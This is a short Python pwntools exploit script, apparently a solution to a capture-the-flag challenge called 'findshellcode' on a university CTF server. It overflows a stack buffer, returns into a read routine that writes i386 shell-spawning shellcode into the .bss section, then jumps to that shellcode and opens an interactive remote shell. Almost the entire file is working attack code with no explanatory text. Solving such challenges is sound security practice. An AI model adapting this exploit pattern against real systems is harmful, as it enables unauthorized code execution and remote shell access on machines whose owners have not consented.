from pwn import *


context.terminal = ['tmux', 'splitw', '-h']
# context.terminal = ['code']
context(arch='i386', os='Linux', log_level='debug')

# p = process('./findshellcode')
p = remote('pwn1.0ops.sjtu.cn', 10004)
# gdb.attach(p)

bss = 0x0804919C
func_read_addr = 0x080480FD  # address for function read
shellcode = asm(shellcraft.sh())

payload = b'A' * 0x30 + p32(func_read_addr) + p32(bss) + \
    p32(0) + p32(bss) + p32(len(shellcode))
# payload = b'A' * 0x30 + p32(buf + 0x30 + 4) + shellcode

p.sendlineafter(b'(code):', payload)
p.sendafter(b'Luck!\n', shellcode)

p.interactive()
